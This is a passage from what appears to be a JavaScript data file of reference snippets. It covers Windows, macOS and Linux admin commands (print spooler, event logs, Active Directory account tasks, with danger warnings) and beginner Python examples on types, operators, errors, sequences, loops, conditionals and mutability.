 danger:"Deletes all pending print jobs. Windows step needs admin.",
 code:{
  ps:`Stop-Service Spooler -Force
Remove-Item "$env:SystemRoot\\System32\\spool\\PRINTERS\\*" -Force -ErrorAction SilentlyContinue
Start-Service Spooler`,
  cmd:`net stop spooler
del /q /f "%SystemRoot%\\System32\\spool\\PRINTERS\\*.*"
net start spooler`,
  mac:`cancel -a -        # cancel jobs on all printers (CUPS)`,
  linux:`cancel -a         # CUPS: cancel all jobs`
 }},
{id:"mnt-printers", level:"beginner", cat:"Maintenance", title:"List printers & default",
 desc:"Installed printers and which one is the default.",
 code:{
  ps:`Get-Printer | Select-Object Name, DriverName, PortName, Shared, PrinterStatus
"Default: " + (Get-CimInstance Win32_Printer | Where-Object Default).Name`,
  cmd:`wmic printer get name,default,portname
:: wmic deprecated; prefer PowerShell Get-Printer`,
  mac:`lpstat -p -d`,
  linux:`lpstat -p -d`
 }},
{id:"mnt-event-errors", level:"beginner", cat:"Maintenance", title:"Recent system errors & warnings",
 desc:"Critical/error log entries from the last day — post-incident triage.",
 code:{
  ps:`Get-WinEvent -FilterHashtable @{LogName='System'; Level=1,2; StartTime=(Get-Date).AddDays(-1)} -MaxEvents 25 |
  Select-Object TimeCreated, Id, ProviderName, LevelDisplayName`,
  cmd:`wevtutil qe System /q:"*[System[(Level=1 or Level=2)]]" /c:25 /rd:true /f:text`,
  mac:`log show --last 1d --predicate 'messageType == 16 || messageType == 17' 2>/dev/null | tail -30`,
  linux:`journalctl -p err -b --no-pager | tail -30`
 }},
{id:"mnt-clip", level:"beginner", cat:"Maintenance", title:"Copy output / file to clipboard",
 desc:"Pipe text or a file straight into the system clipboard.",
 code:{
  ps:`Get-Content .\\file.txt -Raw | Set-Clipboard
# or: "some text" | Set-Clipboard`,
  cmd:`clip < file.txt
:: or: echo some text | clip`,
  mac:`pbcopy < file.txt
# or: echo "some text" | pbcopy`,
  linux:`xclip -selection clipboard < file.txt   # X11 (or: wl-copy < file.txt on Wayland)`
 }},

/* ---------- ACTIVE DIRECTORY (added) — PowerShell; needs RSAT + domain ---------- */
{id:"ad-userfind", level:"intermediate", cat:"Active Directory", title:"Find an AD user",
 desc:"Search AD for a user and key account flags. Needs RSAT ActiveDirectory module + domain.",
 code:{
  ps:`Get-ADUser -Filter "Name -like '*smith*'" -Properties Enabled,LockedOut,LastLogonDate |
  Select-Object Name, SamAccountName, Enabled, LockedOut, LastLogonDate`,
  cmd:`dsquery user -name "*smith*"`
 }},
{id:"ad-unlock", level:"intermediate", cat:"Active Directory", title:"Unlock / reset an AD account",
 desc:"Clear a lockout and optionally force a password reset. Needs RSAT + delegated rights.",
 danger:"Changes another user's account state/credentials — authorized admins only.",
 code:{
  ps:`Unlock-ADAccount -Identity jsmith
# force a reset at next logon:
Set-ADAccountPassword -Identity jsmith -Reset
Set-ADUser -Identity jsmith -ChangePasswordAtLogon $true`
 }},
{id:"ad-groupmembers", level:"intermediate", cat:"Active Directory", title:"List AD group members",
 desc:"Enumerate members of a domain group (recursively). Needs RSAT + domain.",
 code:{
  ps:`Get-ADGroupMember -Identity 'Domain Admins' -Recursive |
  Select-Object Name, SamAccountName, objectClass`,
  cmd:`net group "Domain Admins" /domain`
 }},
{id:"ad-computers", level:"intermediate", cat:"Active Directory", title:"Find AD computers / last logon",
 desc:"Domain-joined machines, OS, and last logon — find stale computer accounts. Needs RSAT.",
 code:{
  ps:`Get-ADComputer -Filter * -Properties OperatingSystem, LastLogonDate |
  Select-Object Name, OperatingSystem, LastLogonDate |
  Sort-Object LastLogonDate`,
  cmd:`dsquery computer -limit 0`
 }},
{id:"ad-repl-health", level:"intermediate", cat:"Active Directory", title:"Check DC replication health",
 desc:"Domain controller replication summary and health checks. Run with access to a DC (RSAT).",
 code:{
  ps:`repadmin /replsummary
dcdiag /q`,
  cmd:`repadmin /replsummary
dcdiag /q`
 }},

/* ================= PYTHON EXAMPLES ================= */

{id:"py-var-datatypes", cat:"Python Examples", title:"Basics · Values and data types",
 level:"beginner", example_output:"<class 'int'>\n<class 'float'>\n<class 'str'>\n<class 'bool'>\n<class 'list'>",
 desc:"In Python every value has a type that decides what you can do with it — you can multiply two ints but not add a string to an int. The built-in type() reports it, which is invaluable when a bug turns out to be a value that isn't the type you assumed (a number that's secretly a string). The everyday types are int (whole numbers), float (decimals), str (text), bool (True/False), and containers like list.",
 code:{py:`# every value has a type
print(type(42))        # <class 'int'>
print(type(3.14))      # <class 'float'>
print(type("hi"))      # <class 'str'>
print(type(True))      # <class 'bool'>
print(type([1, 2]))    # <class 'list'>`}},
{id:"py-var-operators", cat:"Python Examples", title:"Basics · Operators and operands",
 level:"beginner", example_output:"10\n4\n21\n2.3333333333333335\n2\n1\n343",
 desc:"Arithmetic operators take one or two operands and produce a new value. Two catch people out: / always gives a float (7/3 is 2.333…, not 2), while // does floor division; % (modulo) returns the remainder, handy for 'is it even?' (n % 2) or wrapping a range. ** is exponent.",
 code:{py:`print(7 + 3)     # 10   addition
print(7 - 3)     # 4
print(7 * 3)     # 21
print(7 / 3)     # 2.333...  true division (float)
print(7 // 3)    # 2    floor division
print(7 % 3)     # 1    modulo (remainder)
print(7 ** 3)    # 343  exponent`}},
{id:"py-var-calls", cat:"Python Examples", title:"Basics · Function calls",
 level:"beginner", example_output:"5\n9\n7",
 desc:"A function call — a name followed by parentheses — runs that function and evaluates to its return value, which you can drop straight into a bigger expression. Here abs(-4) + round(2.7) becomes 4 + 3 = 7 before print ever sees it. Built-ins like len(), max(), abs(), and round() are vocabulary you'll reach for constantly.",
 code:{py:`print(len("hello"))            # 5
print(max(3, 9, 2))            # 9
print(abs(-4) + round(2.7))    # 4 + 3 = 7  (calls nested in an expression)`}},
{id:"py-var-typeconv", cat:"Python Examples", title:"Basics · Type conversion functions",
 level:"beginner", example_output:"43\n3.5\n100%\n3\nFalse True",
 desc:"Type-conversion functions build a new value of one type from another: int(), float(), str(), bool(). Reach for them at the boundaries — turning the text from input() into a number, or a number into text so you can join it with +. Two gotchas: int() on a float truncates toward zero (int(3.9) is 3, not 4), and bool() is False only for 'empty' values like 0, '', and [] — everything else is True.",
 code:{py:`print(int("42") + 1)     # 43   str -> int
print(float("3.5"))      # 3.5
print(str(100) + "%")    # "100%"  int -> str
print(int(3.9))          # 3    truncates toward zero
print(bool(0), bool(2))  # False True`}},
{id:"py-var-variables", cat:"Python Examples", title:"Basics · Variables",
 level:"beginner", example_output:"Hello 17 3.14159",
 desc:"A variable is a name bound to a value with = — think of it as a label you stick on data so you can refer to it later. The name goes on the left, the value on the right. Reading a name that was never assigned raises NameError, so assign before you use. print() shows several values separated by spaces.",
 code:{py:`message = "Hello"
n = 17
pi = 3.14159
print(message, n, pi)`}},
{id:"py-var-names-keywords", cat:"Python Examples", title:"Basics · Variable names and keywords",
 level:"beginner", example_output:"['False', 'None', 'True', 'and', 'as', 'assert', 'async', 'await', 'break', 'class', 'continue', 'def', 'del', 'elif', 'else', 'except', 'finally', 'for', 'from', 'global', 'if', 'import', 'in', 'is', 'lambda', 'nonlocal', 'not', 'or', 'pass', 'raise', 'return', 'try', 'while', 'with', 'yield']",
 desc:"Names may contain letters, digits, and underscores but can't start with a digit, and they're case-sensitive (count and Count differ). By convention variables use snake_case. Python reserves a set of keywords (if, for, class, import, …) that have special meaning and can't be used as names — keyword.kwlist prints the full list. A leading underscore (like _total) is legal and conventionally signals 'internal'.",
 code:{py:`# legal: letters, digits, underscore; cannot start with a digit
count = 0
_total = 0
user_name = "sam"
# reserved keywords cannot be used as names:
import keyword
print(keyword.kwlist)   # ['False','None','True','and', ...]`}},
{id:"py-var-stmt-vs-expr", cat:"Python Examples", title:"Basics · Statements vs. expressions",
 level:"beginner", example_output:"7\n13",
 desc:"An expression is anything that evaluates to a value — 3 + 4, len(s), x * 2 — and can appear wherever a value is expected. A statement performs an action: an assignment, a print, an if. The distinction matters because an expression on its own line is legal but pointless (its value is computed, then thrown away), whereas assignments and calls are statements you run for their effect.",
 code:{py:`x = 3 + 4          # statement (assignment); 3 + 4 is an expression
print(x)           # statement that calls print
(3 + 4)            # an expression alone (value 7, but discarded)
y = (x * 2) - 1    # expression evaluated, result assigned
print(y)`}},
{id:"py-var-precedence", cat:"Python Examples", title:"Basics · Order of operations",
 level:"beginner", example_output:"14\n20\n512\n3",
 desc:"When an expression mixes operators, Python applies them in a fixed precedence — parentheses first, then **, then * / // %, then + - — scanning left to right among equals. The exception is **, which is right-associative, so 2**3**2 means 2**(3**2) = 512, not 64. Practical rule: when precedence isn't obvious at a glance, add parentheses; they're free and make intent unmistakable.",
 code:{py:`print(2 + 3 * 4)       # 14, not 20
print((2 + 3) * 4)     # 20
print(2 ** 3 ** 2)     # 512  (** is right-associative: 2**(3**2))
print(10 - 4 - 3)      # 3    (left to right)`}},
{id:"py-var-reassign", cat:"Python Examples", title:"Basics · Reassignment",
 level:"beginner", example_output:"5\nnow a string",
 desc:"Assignment rebinds a name, so the same variable can point at a new value later — and because Python is dynamically typed, the new value can even be a different type (an int becomes a str here). The name doesn't remember its old value; it simply points somewhere new. Convenient, but it means a variable's type can change as the program runs, so keep track of what a name holds.",
 code:{py:`x = 5
print(x)             # 5
x = "now a string"   # same name, new value
print(x)             # now a string`}},
{id:"py-var-update", cat:"Python Examples", title:"Basics · Updating variables",
 level:"beginner", example_output:"2 75",
 desc:"A very common pattern is to update a variable from its own current value — read it, change it, store the result back (count = count + 1). The augmented-assignment shorthands (+=, -=, *=, …) do exactly this in one step, so count += 1 is the same as count = count + 1, just shorter. These are the building blocks of counters and running totals.",
 code:{py:`count = 0
count = count + 1     # read old value, add, store back
count += 1            # shorthand for the same
total = 100
total -= 25           # 75
print(count, total)`}},
{id:"py-var-input", cat:"Python Examples", title:"Basics · Input",
 level:"beginner", example_output:"Your name: Ada\nHi Ada\nYour age: 41\nNext year: 42",
 desc:"input() prints its optional prompt, waits for the user to type a line and press Enter, and returns what they typed as a string — always text, even if they type digits. To do math you must convert first: int(input(...)) or float(input(...)). Forgetting the conversion is the classic beginner bug — '42' + 1 raises TypeError because you can't add a number to a string.",
 code:{py:`# input() always returns a string
name = input("Your name: ")
print("Hi", name)
# convert when you need a number:
age = int(input("Your age: "))
print("Next year:", age + 1)`}},

{id:"py-err-syntax", cat:"Python Examples", title:"Errors · Syntax errors",
 level:"beginner", example_output:"Fix the punctuation, then the file will run.",
 desc:"A syntax error means Python can't even parse your code — it's grammatically wrong, so nothing runs, not even the correct lines above it. Typical causes are an unclosed bracket, a missing colon after if/for/def, or a stray quote. Because the whole file is rejected up front, fix the punctuation the message points at and try again. (The broken examples here are commented out so the file still runs.)",
 code:{py:`# a syntax error stops the program before it runs (shown here as comments)
# print("hi"      <- SyntaxError: '(' was never closed
# if x  == 1      <- SyntaxError: expected ':'
print("Fix the punctuation, then the file will run.")`}},
{id:"py-err-runtime", cat:"Python Examples", title:"Errors · Runtime errors",
 level:"beginner", example_output:"5.0",
 desc:"A runtime error (an exception) happens while the program is running, at a specific line — the code parsed fine, but something went wrong as it executed, like indexing past the end of a list or dividing by zero. Everything before the failing line runs normally, and the traceback names the exception type and line. You handle these with try/except, not by fixing punctuation.",
 code:{py:`nums = [1, 2, 3]
# print(nums[5])   # IndexError at runtime
print(10 / 2)      # runs fine
# print(10 / 0)    # ZeroDivisionError at runtime`}},
{id:"py-err-semantic", cat:"Python Examples", title:"Errors · Semantic errors",
 level:"beginner", example_output:"4.0\n3.0",
 desc:"A semantic (logic) error is the sneakiest kind: the program runs to completion without complaint but gives the wrong answer. Here 2 + 4 / 2 divides before it adds (operator precedence), so you get 4.0 instead of the intended average 3.0. Nothing crashes, so you only catch it by checking results — which is exactly why tests and worked examples matter.",
 code:{py:`# want the average of 2 and 4:
avg = 2 + 4 / 2      # BUG: gives 4.0 (precedence), not 3.0
print(avg)           # 4.0  <- wrong
avg = (2 + 4) / 2    # fixed
print(avg)           # 3.0`}},
{id:"py-err-syntaxerror", cat:"Python Examples", title:"Errors · SyntaxError",
 level:"beginner", example_output:"the examples above are shown as comments so this file still runs",
 desc:"SyntaxError is the specific exception Python raises at parse time when it hits something it can't read as valid Python. The usual culprits are a missing colon, unbalanced parentheses, or assigning to something that isn't a variable (5 = x). Read the caret in the message — it points at where Python got confused, which is usually just after the real mistake.",
 code:{py:`# SyntaxError: code Python can't parse. Common causes:
#   missing ':'      ->  if x > 0
#   unmatched ()     ->  print("hi"
#   invalid target   ->  5 = x
print("the examples above are shown as comments so this file still runs")`}},
{id:"py-err-typeerror", cat:"Python Examples", title:"Errors · TypeError",
 level:"beginner", example_output:"TypeError: can only concatenate str (not \"int\") to str\nfix: age: 30",
 desc:"TypeError means an operation was applied to a value of the wrong type — the classic case is 'age: ' + 30, since Python won't silently glue a string and an int together. The fix is an explicit conversion, str(30), so both sides are the same type. Catching it with try/except lets you print a friendly message instead of crashing.",
 code:{py:`try:
    result = "age: " + 30      # can't concatenate str and int
except TypeError as e:
    print("TypeError:", e)
print("fix:", "age: " + str(30))`}},
{id:"py-err-nameerror", cat:"Python Examples", title:"Errors · NameError",
 level:"beginner", example_output:"NameError: name 'totl' is not defined\n10",
 desc:"NameError means you used a name Python has never seen assigned — almost always a typo (totl for total) or using a variable before the line that defines it. Python reads top to bottom, so a name must be bound before you reference it. The message quotes the offending name, which usually makes the typo jump out.",
 code:{py:`try:
    print(totl)        # meant 'total'
except NameError as e:
    print("NameError:", e)
total = 10
print(total)`}},
{id:"py-err-valueerror", cat:"Python Examples", title:"Errors · ValueError",
 level:"beginner", example_output:"ValueError: invalid literal for int() with base 10: 'twelve'\n12",
 desc:"ValueError means the type is right but the value doesn't make sense for the operation — int('twelve') fails because, although it's a string as int() expects, 'twelve' isn't a parseable number (int('12') works). It shows up constantly when converting user input, so wrap those conversions in try/except and re-prompt on failure.",
 code:{py:`try:
    n = int("twelve")     # can't parse this as an int
except ValueError as e:
    print("ValueError:", e)
print(int("12"))          # works`}},

{id:"py-mod-import", cat:"Python Examples", title:"Modules · Importing modules",
 level:"beginner", example_output:"4.0\n3     ← randint(1, 6), varies each run\n4",
 desc:"import makes another module's code available. Three forms cover most needs: import math (then use math.sqrt), from random import randint (pull one name in directly), and import statistics as stats (a shorter alias). Prefer 'import module' or explicit 'from module import name' over 'import *', which dumps everything and hides where names came from.",
 code:{py:`import math                     # whole module
from random import randint      # one name from a module
import statistics as stats      # with an alias
print(math.sqrt(16))            # 4.0
print(randint(1, 6))            # a die roll
print(stats.mean([2, 4, 6]))    # 4`}},
{id:"py-mod-random", cat:"Python Examples", title:"Modules · The random module",
 level:"beginner", example_output:"0.5488135039273248   ← random float in [0.0, 1.0)\n4                    ← randint(1, 6)\nb                    ← choice(...)\n[3, 1, 5, 2, 4]      ← deck after shuffle",
 desc:"The random module generates pseudo-random values. The staples: random() for a float in [0.0, 1.0), randint(a, b) for an integer including both ends, choice(seq) to pick one item, and shuffle(seq) to reorder a list in place (it returns None and mutates the list). Call random.seed(n) first when you need reproducible results, e.g. in tests.",
 code:{py:`import random
print(random.random())            # float in [0.0, 1.0)
print(random.randint(1, 6))       # int 1..6 inclusive
print(random.choice(["a", "b", "c"]))
deck = [1, 2, 3, 4, 5]
random.shuffle(deck)              # shuffles in place
print(deck)`}},

{id:"py-turtle", cat:"Python Examples", title:"Turtle · The turtle module",
 level:"beginner",
 desc:"The turtle module is a friendly first taste of objects and graphics: you create a Screen and a Turtle (each an object), then call methods on them — forward(), right(), color() — to move a pen and draw. It's a hands-on way to meet instances, attributes, and methods before classes are introduced formally. This script draws a square; mainloop() keeps the window open.",
 code:{py:`import turtle
wn = turtle.Screen()      # a Screen instance
t = turtle.Turtle()       # a Turtle instance (object)
t.color("blue")           # set drawing state via methods
t.pensize(3)
for _ in range(4):        # draw a square by calling methods
    t.forward(100)
    t.right(90)
wn.mainloop()             # keep the window open`}},

{id:"py-seq-types", cat:"Python Examples", title:"Sequences · Strings, lists, tuples",
 level:"beginner", example_output:"hello [1, 2, 3] (4, 5, 6)\n<class 'str'> <class 'list'> <class 'tuple'>",
 desc:"Strings, lists, and tuples are all sequences — ordered collections you can index, slice, and loop over the same way. The key difference is mutability: a list can be changed in place (append an item, reassign one), while strings and tuples are immutable, so any 'change' really builds a new object. Reach for a list when contents will change, a tuple for a fixed record, a string for text.",
 code:{py:`s = "hello"            # string  (immutable sequence of chars)
lst = [1, 2, 3]        # list    (mutable sequence)
tup = (4, 5, 6)        # tuple   (immutable sequence)
print(s, lst, tup)
print(type(s), type(lst), type(tup))`}},
{id:"py-seq-index", cat:"Python Examples", title:"Sequences · Index operator",
 level:"beginner", example_output:"P\nT\nN\n20",
 desc:"The index operator [] pulls out one item by position. Counting starts at 0, so s[0] is the first character and s[2] is the third. Negative indices count from the right, so s[-1] is always the last item — handy when you don't know the length. Indexing past the end raises IndexError.",
 code:{py:`s = "PYTHON"
print(s[0])    # 'P'  first item
print(s[2])    # 'T'
print(s[-1])   # 'N'  last item
data = [10, 20, 30]
print(data[1]) # 20`}},
{id:"py-seq-len", cat:"Python Examples", title:"Sequences · Length (len)",
 level:"beginner", example_output:"5\n4\n0\na",
 desc:"len() returns how many items a sequence holds — characters in a string, elements in a list or tuple. It's the go-to for bounds and loops: the last valid index is len(seq) - 1, and range(len(seq)) walks every position. len() of an empty sequence is 0.",
 code:{py:`print(len("hello"))       # 5
print(len([1, 2, 3, 4]))  # 4
print(len(()))            # 0
word = "banana"
print(word[len(word) - 1])   # last char via len`}},
{id:"py-seq-slice", cat:"Python Examples", title:"Sequences · Slice operator",
 level:"beginner", example_output:"bcd\nabc\nefg\naceg\ngfedcba",
 desc:"A slice [start:stop:step] returns a new sub-sequence — from start up to but not including stop. Omit either end to run to the beginning or end (s[:3], s[4:]), add a step to skip items (s[::2]), and use a negative step to reverse (s[::-1]). Slicing never raises for out-of-range bounds; it just clamps to what exists.",
 code:{py:`s = "abcdefg"
print(s[1:4])    # 'bcd'   start:stop
print(s[:3])     # 'abc'   from start
print(s[4:])     # 'efg'   to end
print(s[::2])    # 'aceg'  step
print(s[::-1])   # 'gfedcba' reversed`}},
{id:"py-seq-concat-repeat", cat:"Python Examples", title:"Sequences · Concatenation and repetition",
 level:"beginner", example_output:"[1, 2, 3, 4]\nabcd\n==========\n[0, 0, 0]",
 desc:"The + operator joins two sequences of the same type into a new one, and * repeats a sequence a given number of times. They're a quick way to build separator strings ('=' * 10) or pre-sized lists ([0] * 3). Both create new objects rather than modifying in place, and you can't concatenate across types (list + str fails).",
 code:{py:`print([1, 2] + [3, 4])   # [1, 2, 3, 4]  concatenation
print("ab" + "cd")       # 'abcd'
print("=" * 10)          # '=========='  repetition
print([0] * 3)           # [0, 0, 0]`}},
{id:"py-seq-count-index", cat:"Python Examples", title:"Sequences · count and index",
 level:"beginner", example_output:"3\n3\n3\n2",
 desc:"count(x) tallies how many times x appears in a sequence, and index(x) returns the position of its first occurrence (raising ValueError if it's absent). Both work on strings and lists. Use count() for frequency questions and index() to locate an item — though for a plain 'is it here at all?' the in operator (x in seq) reads better.",
 code:{py:`nums = [1, 2, 2, 3, 2]
print(nums.count(2))     # 3   how many times 2 appears
print(nums.index(3))     # 3   position of first 3
print("banana".count("a"))  # 3
print("banana".index("n"))  # 2`}},
{id:"py-seq-split-join", cat:"Python Examples", title:"Sequences · Splitting and joining strings",
 level:"beginner", example_output:"['sam', '42', 'blue']\n['the', 'quick', 'fox']\n2024-01-15",
 desc:"split() breaks a string into a list on a separator (or on any run of whitespace when you pass no argument), and join() does the reverse — it glues a list of strings together using the string you call it on as the glue ('-'.join(...)). They're the everyday tools for parsing CSV-like text and reassembling it. join() requires every item to already be a string.",
 code:{py:`csv = "sam,42,blue"
parts = csv.split(",")        # ['sam', '42', 'blue']
print(parts)
sentence = "the quick fox"
print(sentence.split())       # splits on whitespace
joined = "-".join(["2024", "01", "15"])
print(joined)                 # '2024-01-15'`}},

{id:"py-for-loop", cat:"Python Examples", title:"For loops · The for loop",
 level:"beginner", example_output:"count: 1\ncount: 2\ncount: 3\ndone",
 desc:"A for loop runs its indented block once for each item in a sequence, binding the loop variable to the current item each pass. It's the go-to when you know what you're iterating over — a list, a string, a range. Unlike a while loop you don't manage a counter; Python walks the items for you and stops automatically at the end.",
 code:{py:`for i in [1, 2, 3]:
    print("count:", i)
print("done")`}},
{id:"py-for-strings", cat:"Python Examples", title:"For loops · Iterating over strings",
 level:"beginner", example_output:"c\na\nt",
 desc:"Strings are iterable, so a for loop hands you one character at a time. This is how you scan or transform text character by character — counting vowels, building a filtered copy, and so on. Each item is itself a one-character string (Python has no separate character type).",
 code:{py:`for ch in "cat":
    print(ch)          # c, a, t on separate lines`}},
{id:"py-for-lists", cat:"Python Examples", title:"For loops · Iterating over lists",
 level:"beginner", example_output:"APPLE\nPEAR\nFIG",
 desc:"Looping directly over a list gives you each element in turn — cleaner than indexing when you don't need the position. Here each fruit is upper-cased as it's visited. This 'for item in list' form is the most Pythonic way to process a collection; fall back to indices only when you specifically need them.",
 code:{py:`fruits = ["apple", "pear", "fig"]
for fruit in fruits:
    print(fruit.upper())`}},
{id:"py-for-range", cat:"Python Examples", title:"For loops · The range function",
 level:"beginner", example_output:"[0, 1, 2, 3, 4]\n[2, 3, 4, 5, 6, 7]\n[0, 2, 4, 6, 8]\ni = 0\ni = 1\ni = 2",
 desc:"range() produces a run of integers on demand: range(stop) counts 0 up to stop-1, range(start, stop) begins elsewhere, and range(start, stop, step) skips by step. It's lazy — it doesn't build the whole list in memory — which is why you wrap it in list() to see it. Pair it with for to repeat something a fixed number of times.",
 code:{py:`print(list(range(5)))        # [0, 1, 2, 3, 4]
print(list(range(2, 8)))     # [2, 3, 4, 5, 6, 7]
print(list(range(0, 10, 2))) # [0, 2, 4, 6, 8]
for i in range(3):
    print("i =", i)`}},
{id:"py-for-accumulator", cat:"Python Examples", title:"For loops · The accumulator pattern",
 level:"beginner", example_output:"sum: 21",
 desc:"The accumulator pattern builds a result across a loop: start with an initial value (0 for a sum, 1 for a product, '' or [] for building text or lists), update it on each pass, then use it after the loop ends. It's the manual version of built-ins like sum(), and the mental model behind most 'compute one value from many' tasks.",
 code:{py:`total = 0                 # initialize accumulator
for n in [4, 7, 1, 9]:
    total = total + n     # update each pass
print("sum:", total)      # 21`}},
{id:"py-for-index", cat:"Python Examples", title:"For loops · Traversal by index",
 level:"beginner", example_output:"0 a\n1 b\n2 c",
 desc:"Sometimes you need each item's position as well as its value — for that, loop over range(len(seq)) and index in with seq[i]. Use it when the index itself matters (numbering output, comparing neighbours). When you want index and value together, enumerate(seq) is tidier, but this pattern makes the mechanics explicit.",
 code:{py:`letters = ["a", "b", "c"]
for i in range(len(letters)):
    print(i, letters[i])      # index and value`}},
{id:"py-for-nested", cat:"Python Examples", title:"For loops · Nested iteration",
 level:"beginner", example_output:"1x1=1  1x2=2  1x3=3  \n2x1=2  2x2=4  2x3=6  \n3x1=3  3x2=6  3x3=9  ",
 desc:"Nesting one loop inside another lets you work over combinations — every pairing of the outer and inner sequences. The inner loop runs to completion on each single pass of the outer loop, so this prints a full multiplication grid: for each row, all its columns. Mind the indentation; it's what tells Python which loop a statement belongs to.",
 code:{py:`for row in range(1, 4):
    for col in range(1, 4):
        print(f"{row}x{col}={row*col}", end="  ")
    print()               # newline after each row`}},

{id:"py-cond-bool", cat:"Python Examples", title:"Conditionals · Boolean values and expressions",
 level:"beginner", example_output:"True\nFalse\nTrue\nTrue\n<class 'bool'>",
 desc:"Comparison operators (>, <, ==, !=, >=, <=) evaluate to a Boolean — either True or False, both of type bool. These are the yes/no answers your program branches on. Note that == tests equality (two equals signs) while a single = assigns; mixing them up is a classic beginner slip.",
 code:{py:`print(5 > 3)        # True
print(5 == 3)       # False
print(5 != 3)       # True
x = 10
print(x >= 10)      # True
print(type(True))   # <class 'bool'>`}},
{id:"py-cond-logical", cat:"Python Examples", title:"Conditionals · Logical operators (and/or/not)",
 level:"beginner", example_output:"False\nTrue\nFalse\nTrue",
 desc:"and, or, and not combine Boolean values into a single answer. 'a and b' is True only when both are; 'a or b' is True when at least one is; 'not a' flips the value. They let one if-test capture a compound condition, like age > 18 and age < 65 for 'an adult under 65'.",
 code:{py:`print(True and False)   # False  (both must be true)
print(True or False)    # True   (either)
print(not True)         # False
age = 25
print(age > 18 and age < 65)   # True`}},
{id:"py-cond-shortcircuit", cat:"Python Examples", title:"Conditionals · Short-circuit evaluation",
 level:"beginner", example_output:"False\nTrue\nFalse",
 desc:"Python evaluates and/or left to right and stops the moment the result is known: 'and' short-circuits at the first False, 'or' at the first True, so the rest never runs. Beyond speed this is a safety tool — 'x != 0 and 10/x > 1' skips the division when x is 0, dodging a ZeroDivisionError. Put the cheap or protective check first.",
 code:{py:`def loud():
    print("evaluated!")
    return True
print(False and loud())   # loud() never runs -> False
print(True or loud())     # loud() never runs -> True
# use it as a guard:
x = 0
print(x != 0 and (10 / x) > 1)   # right side skipped, no ZeroDivisionError`}},
{id:"py-cond-in", cat:"Python Examples", title:"Conditionals · in and not in operators",
 level:"beginner", example_output:"True\nTrue\nTrue\nTrue",
 desc:"The in operator asks 'is this value present?' and returns a Boolean — it works on strings (substring test), lists and tuples (element test), and dicts (where it checks the keys). 'not in' is its negation. It's the clean, readable way to test membership instead of writing a loop yourself.",
 code:{py:`print("a" in "cat")            # True
print(3 in [1, 2, 3])          # True
print("z" not in "cat")        # True
print("key" in {"key": 1})     # True (checks dict keys)`}},
{id:"py-cond-precedence", cat:"Python Examples", title:"Conditionals · Operator precedence",
 level:"beginner", example_output:"True\nTrue\nFalse",
 desc:"When arithmetic, comparison, and logical operators mix, Python resolves them in that order: arithmetic first, then comparisons, then not, then and, then or. So 2 + 3 == 5 compares 5 to 5, and 'True or False and False' groups as 'True or (False and False)'. When a compound test isn't obviously grouped, add parentheses.",
 code:{py:`print(2 + 3 == 5)              # True  (arithmetic before ==)
print(True or False and False) # True  (and before or)
print(not 5 > 3)               # False (> before not)`}},
{id:"py-cond-ifelse", cat:"Python Examples", title:"Conditionals · Binary selection (if/else)",
 level:"beginner", example_output:"odd",
 desc:"if/else picks exactly one of two paths: the if-block runs when the condition is True, otherwise the else-block runs — never both. The condition is any expression Python reads as truthy or falsy. Here n % 2 checks the remainder to decide even vs odd, a tiny but extremely common test.",
 code:{py:`n = 7
if n % 2 == 0:
    print("even")
else:
    print("odd")`}},
{id:"py-cond-if", cat:"Python Examples", title:"Conditionals · Unary selection (if only)",
 level:"beginner", example_output:"It's hot!\ndone",
 desc:"A bare if runs its block only when the condition is True and simply skips it otherwise — there's no alternative branch. Code after the if (back at the outer indentation) runs either way. Use it for optional actions: warn if a value is out of range, add a note if a flag is set.",
 code:{py:`temp = 95
if temp > 90:
    print("It's hot!")     # runs only when condition is True
print("done")              # always runs`}},
{id:"py-cond-nested", cat:"Python Examples", title:"Conditionals · Nested conditionals",
 level:"beginner", example_output:"positive",
 desc:"Conditionals can nest: an if or else block can contain another if. The inner test is reached only once the outer one is decided, letting you narrow down in stages — here first 'is it non-negative?', then 'zero or positive?'. Deep nesting gets hard to read, so once you're three levels in, consider elif or moving logic into a function.",
 code:{py:`x = 5
if x >= 0:
    if x == 0:
        print("zero")
    else:
        print("positive")
else:
    print("negative")`}},
{id:"py-cond-elif", cat:"Python Examples", title:"Conditionals · Chained conditionals (elif)",
 level:"beginner", example_output:"B",
 desc:"elif chains several conditions tested top to bottom; the first True one runs, the rest are skipped, and an optional else catches whatever is left. This is the clean way to map ranges to categories (a grade from a score) — far tidier than nested if/else. Order matters: put the most specific or highest thresholds first.",
 code:{py:`score = 82
if score >= 90:
    grade = "A"
elif score >= 80:
    grade = "B"
elif score >= 70:
    grade = "C"
else:
    grade = "F"
print(grade)      # B`}},
{id:"py-cond-accum-max", cat:"Python Examples", title:"Conditionals · Accumulator with conditionals (max)",
 level:"beginner", example_output:"max: 74",
 desc:"To find the largest (or smallest) value yourself, combine the accumulator pattern with a conditional: seed 'biggest' with the first item, then on each pass update it only when you meet something larger. It's exactly what the built-in max() does under the hood — worth writing once by hand to understand, then reaching for max()/min() in real code.",
 code:{py:`nums = [3, 41, 12, 9, 74, 15]
biggest = nums[0]              # start with the first
for n in nums:
    if n > biggest:           # conditional update
        biggest = n
print("max:", biggest)        # 74`}},

{id:"py-mut-mutability", cat:"Python Examples", title:"Mutation · Mutability vs. immutability",
 level:"beginner", example_output:"[99, 2, 3]\nzbc",
 desc:"Mutability is whether an object can be changed after it's created. Lists are mutable — lst[0] = 99 edits the existing list. Strings and tuples are immutable — you can't assign into them (s[0] = 'z' raises TypeError), so you rebuild a new string instead. This one distinction drives much of Python's behaviour around copying and aliasing.",
 code:{py:`lst = [1, 2, 3]
lst[0] = 99          # OK: lists are mutable
print(lst)           # [99, 2, 3]
s = "abc"
# s[0] = "z"         # TypeError: strings are immutable
s = "zbc"            # must rebuild instead
print(s)`}},
{id:"py-mut-del", cat:"Python Examples", title:"Mutation · List element deletion (del)",
 level:"beginner", example_output:"['a', 'c', 'd']\n['d']",
 desc:"del removes items from a list by position — a single index (del lst[1]) or a whole slice (del lst[0:2]) — shifting the remaining elements down. It changes the list in place and returns nothing. (del can also unbind a plain variable name, but on lists it's about removing elements.)",
 code:{py:`lst = ["a", "b", "c", "d"]
del lst[1]           # remove by index
print(lst)           # ['a', 'c', 'd']
del lst[0:2]         # remove a slice
print(lst)           # ['d']`}},
{id:"py-mut-refs", cat:"Python Examples", title:"Mutation · Objects and references",
 level:"beginner", example_output:"True\nTrue\nFalse",
 desc:"A variable doesn't hold an object directly; it holds a reference to one. b = a makes b point at the very same list, so 'a is b' (identity) is True. A separate list with equal contents gives 'a == c' True (same values) but 'a is c' False (different objects). Rule of thumb: == compares contents, is compares identity — use is mainly for None.",
